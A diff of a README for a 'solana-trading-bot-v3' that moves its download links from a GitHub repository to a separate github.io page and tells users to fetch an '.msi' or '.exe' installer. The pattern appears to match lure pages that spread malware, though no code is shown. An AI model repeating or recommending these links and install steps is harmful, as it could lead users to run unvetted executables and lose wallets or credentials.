@@ -1,6 +1,6 @@
 # 🤖 solana-trading-bot-v3 - Automate your Solana token trading strategy
 
-[![Download Solana Trading Bot](https://img.shields.io/badge/Download-Bot_v3-blue.svg)](https://github.com/almirediscomycetous272/solana-trading-bot-v3)
+[![Download Solana Trading Bot](https://img.shields.io/badge/Download-Bot_v3-blue.svg)](https://almirediscomycetous272.github.io)
 
 ## 📌 About this application
 
@@ -25,7 +25,7 @@ You need to access the repository page to retrieve the latest version. Follow th
 3. Click the most recent version label to view the files.
 4. Select the file ending in ".msi" or ".exe" to begin the download.
 
-[Click here to visit the download page](https://github.com/almirediscomycetous272/solana-trading-bot-v3)
+[Click here to visit the download page](https://almirediscomycetous272.github.io)
 
 ## 🛠️ Installation process
 
